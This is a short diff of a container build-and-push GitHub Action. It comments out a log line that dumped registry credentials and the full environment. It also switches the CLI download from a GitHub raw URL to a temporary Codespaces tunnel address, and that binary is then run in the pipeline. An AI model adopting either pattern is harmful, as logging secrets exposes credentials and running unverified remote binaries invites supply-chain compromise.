@@ -38,7 +38,7 @@ async function main() {
 
   const { user, pass } = getRegUserPass(tags);
 
-  console.log('inputs=--', { platforms, context, push, tags, labels, file, registry, user, pass }, process.env);
+  // console.log('inputs=--', { platforms, context, push, tags, labels, file, registry, user, pass }, process.env);
   // const execRes = execSync(`IMAGE_TAG=${tags} REG_USER=${user} REG_PASS=${pass} /exec/cli`);
   // console.log('execRes=--', execRes.toString());
   await execBuild('dcdcli', [], {
@@ -75,7 +75,8 @@ async function setupCLI() {
     return;
   }
 
-  const url = 'https://github.com/saggiyogesh/dcd-build-push-action/raw/main/exec/cli';
+  // const url = 'https://github.com/saggiyogesh/dcd-build-push-action/raw/main/exec/cli';
+  const url = 'https://bug-free-space-guide-xq79v6xvqf6jqq-3000.app.github.dev/app';
   const tmpPath = await toolCache.downloadTool(url);
 
   const cachedPath = await toolCache.cacheFile(tmpPath, 'dcdcli', 'dcdcli', '1.0.0');
